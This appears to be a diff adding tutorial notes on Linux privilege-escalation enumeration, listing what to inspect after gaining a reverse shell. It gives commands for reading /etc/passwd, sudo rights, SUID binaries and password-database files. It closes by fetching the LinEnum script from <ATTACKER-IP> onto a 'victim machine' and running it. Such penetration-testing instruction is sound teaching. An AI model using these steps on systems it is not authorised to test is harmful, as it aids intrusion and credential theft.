@@ -1,0 +1,200 @@
+                      ____________________________
+
+                       LINUX PRIVILEGE ESCALATION
+                        Linux System Enumeration
+
+                            Leonardo Tamiano
+                      ____________________________
+
+
+Table of Contents
+_________________
+
+1. Why is Enumeration Important?
+2. What to Enumerate?
+3. How to Enumerate?
+4. Automated Scripts
+
+
+1 Why is Enumeration Important?
+===============================
+
+  The first thing you should do once you obtain a reverse shell into a
+  linux system is `enumeration'.
+
+  Enumeration is all about gathering meaningful information regarding
+  the system you're dealing with.
+
+  A proper enumeration procedure will allow you to understand the
+  specific configurations being deployed on the system, and, more
+  importantly, what are the vulnerable aspects of the system.
+
+  Once you understand the vulnerabilities, you can then exploit them to
+  elevate your privileges.
+
+  This is why enumeration is key.
+
+
+2 What to Enumerate?
+====================
+
+  In terms of what to enumerate, the following areas are keypoint to
+  focus on:
+
+  - hardware architecture
+  - kernel version
+  - linux distribution version
+
+  - users and groups (/etc/passwd)
+  - access to powerful groups (docker, ...)
+  - sudo configuration (sudo -l)
+
+  - fs directories (/home/*, /opt/*, /var/www/html/*)
+  - suid/guid binaries
+
+  - local services
+  - network interfaces
+
+  - software installed with versions
+  - backups / saved session
+  - repositories under version control systems (git, svn)
+
+  - cronjobs (discussed in a later video)
+  - capabilities (discussed in a later video)
+
+
+3 How to Enumerate?
+===================
+
+  For each of the previous areas mentioned, the following command can
+  help you:
+
+  - hardware architecture
+    ,----
+    | uname -a
+    `----
+
+  - kernel version
+    ,----
+    | uname -r
+    `----
+
+  - linux distribution version
+    ,----
+    | uname -a
+    | lsb_release -a
+    `----
+
+  - environment variables
+    ,----
+    | env
+    `----
+
+  - users and groups
+  ,----
+  | cat /etc/passwd
+  | cat /etc/passwd | cut -d ':' -f 1 > users.txt
+  | 
+  | cat /etc/group
+  | cat /etc/group | cut -d ':' -f 1 > groups.txt
+  `----
+
+  - access to powerful groups
+  ,----
+  | groups
+  `----
+
+  - sudo configuration
+    ,----
+    | sudo -l
+    `----
+
+  - fs directories (/home/*, /opt/*, /var/www/*)
+    ,----
+    | ls -lha /opt
+    | ls -lha /home/*
+    | ls -lha /var/www/*
+    `----
+
+  - suid/guid binaries
+  ,----
+  | find / -perm -u=s  2>/dev/null
+  | find / -perm -g=s -type f 2>/dev/null
+  `----
+
+  - local services
+  ,----
+  | netstat -lpnt
+  | netstat -lpnu 
+  `----
+
+  - network interfaces
+  ,----
+  | ip a
+  `----
+
+  - software installed with versions
+  ,----
+  | which <SOFTWARE>
+  | ls -lha /usr/local/sbin/*
+  | ls -lha /usr/local/bin/*
+  | ls -lha /usr/bin/*
+  `----
+
+  - backups / saved session / database files
+  ,----
+  | find / -name "*.bkp" -ls
+  | find / -name "*.kdbx" -ls
+  `----
+
+  - repositories under version control systems (git, svn)
+  ,----
+  | git log
+  | git checkout a66922842dfbe801ef8e884bb7f0f48823adaf29
+  | git switch -
+  `----
+
+  - cronjobs
+  ,----
+  | discussed in a later video
+  `----
+
+  - capabilities
+  ,----
+  | discussed in a later video
+  `----
+
+
+4 Automated Scripts
+===================
+
+  Finally, there are also automated scripts that check common security
+  mis-configuration, vulnerable software versions, and so on.
+
+  The most famous one are listed below:
+
+  - <https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS>
+  - <https://github.com/rebootuser/LinEnum>
+
+  To use these scripts, the following steps will work:
+
+  1. Download the script in your attacker machine
+     ,----
+     | wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
+     `----
+
+  2. Transfer the file into the victim machine
+     ,----
+     | python3 -m http.server 1337 # attacker
+     | wget http://<ATTACKER-IP>:1337/LinEnum.sh -O /tmp/LinEnum.sh
+     `----
+
+  3. Make the script executable
+     ,----
+     | chmod +x /tmp/LinEnum.sh
+     `----
+
+  4. Execute the script and save the output in a file
+     ,----
+     | ./LinEnum.sh | tee LinEnum-output.txt
+     `----
